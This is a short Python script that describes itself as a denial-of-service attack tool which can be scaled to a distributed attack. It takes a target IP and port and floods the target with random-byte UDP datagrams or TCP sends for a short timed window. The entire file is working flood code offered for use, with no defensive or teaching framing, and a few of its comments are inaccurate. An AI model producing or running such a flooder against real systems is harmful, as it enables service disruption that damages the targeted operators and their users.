"""
this is a Dos attack program and it can be converted into a DDOS attack using multiple computers.

it supports UDP and TCP.

Usage: ./dos_attack <ip> <port>
"""
import random
from random import seed
from random import gauss
import socket
import sys
import time

"""
duration =random.uniform(0.05,0.1)  #50-100 ms. for DDos attack use this line.
"""
duration = 0.05 #50 ms for Dos attack
choice = raw_input(" UDP or TCP(U/T?):")

def usage():
    print("Set the IP and the port.")
    print("Usage:" + sys.argv[0]+ " <ip> <port>")

def dos_attack_udp(ip, port):
    cntr = 0
    #use "SOCK_DGRAM" for UDP method.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server.
    # in udp flood best size is 512-1024, if size too big router may filter it.
    data = random._urandom(1024)
    timeout =  time.time() + duration
    while time.time() < timeout:
        #sendto method, sends a UDP message.
        udp_socket.sendto(data,(ip,port))
        cntr = cntr + 1
        print("send %s packet to %s throught port %s on a UDP connection."%(cntr, ip, port))

def dos_attack_tcp(ip, port):
    cntr = 0
    #use "SOCK_STREAM" for UDP method.
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data = random._urandom(16)
    timeout = time.time() + duration
    tcp_socket.connect((ip,port))
    #send method, sends a TCP message.
    tcp_socket.send(data)
    while time.time()< timeout:
        tcp_socket.send(data)
        cntr = cntr + 1
        print("send %s packet to %s throught port %s on a TCP connection."%(cntr, ip, port))
    tcp_socket.close()
def main():
    if len(sys.argv) != 3:
        usage()
    else:
        if (choice == "U") or (choice == "u"):
            dos_attack_udp(sys.argv[1],int(sys.argv[2]))
        elif (choice == "T") or (choice == "t"):
            dos_attack_tcp(sys.argv[1],int(sys.argv[2]))
        else:
            print("it's an invalid command.")

if __name__ == '__main__':
    main()
